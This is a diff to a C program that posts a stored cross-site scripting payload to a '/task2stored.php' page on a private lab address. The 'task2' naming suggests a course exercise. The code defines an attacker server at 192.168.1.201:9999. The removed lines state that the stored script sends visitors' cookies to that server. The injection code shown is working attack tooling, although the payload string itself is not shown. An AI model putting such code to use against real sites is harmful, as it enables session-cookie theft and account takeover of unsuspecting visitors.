@@ -19,7 +19,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define TARGET_HOST "192.168.1.203"
+#define WEB_IP "192.168.1.203"
 #define TARGET_PORT 80
 #define TARGET_PATH "/task2stored.php"
 #define ATTACKER_SERVER "192.168.1.201:9999"
@@ -30,12 +30,12 @@
  * @dest: Destination buffer for encoded string
  * @dest_size: Size of destination buffer
  * @src: Source string to encode
- * 
+ *
  * Returns: 0 on success, -1 on error
  */
 static int url_encode(char *dest, size_t dest_size, const char *src) {
     size_t dest_pos = 0;
-    
+
     while (*src != '\0' && dest_pos < dest_size - 4) {
         if ((*src >= 'a' && *src <= 'z') ||
             (*src >= 'A' && *src <= 'Z') ||
@@ -52,11 +52,11 @@ static int url_encode(char *dest, size_t dest_size, const char *src) {
         }
         src++;
     }
-    
+
     if (dest_pos >= dest_size) {
         return -1;
     }
-    
+
     dest[dest_pos] = '\0';
     return 0;
 }
@@ -85,19 +85,19 @@ int main(void) {
     printf("Encoded Payload: %s\n", encoded_payload);
 
     snprintf(post_data, sizeof(post_data),
-             "message=%s&submit=Submit", encoded_payload);
+             "comment=%s", encoded_payload);
 
     size_t content_length = strlen(post_data);
 
     snprintf(http_request, sizeof(http_request),
-             "POST %s HTTP/1.1\r\n"
+             "POST /task2stored.php HTTP/1.1\r\n"
              "Host: %s\r\n"
              "Content-Type: application/x-www-form-urlencoded\r\n"
-             "Content-Length: %zu\r\n"
+             "Content-Length: %lu\r\n"
              "Connection: close\r\n"
              "\r\n"
              "%s",
-             TARGET_PATH, TARGET_HOST, content_length, post_data);
+             WEB_IP, content_length, post_data);
 
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (sock_fd < 0) {
@@ -149,17 +149,6 @@ int main(void) {
     printf("--- HTTP Response ---\n%s\n", response_buffer);
 
     close(sock_fd);
-
-    if (strstr(response_buffer, "200 OK") != NULL ||
-        strstr(response_buffer, "302 Found") != NULL ||
-        strstr(response_buffer, "success") != NULL) {
-        printf("\n[SUCCESS] Payload injected successfully!\n");
-        printf("The malicious script has been stored in the database.\n");
-        printf("When a victim visits the page, their cookie will be sent to %s\n", ATTACKER_SERVER);
-    } else {
-        printf("\n[WARNING] Response received but injection status unclear.\n");
-        printf("Check the application manually to verify if the payload was stored.\n");
-    }
 
     return 0;
 }
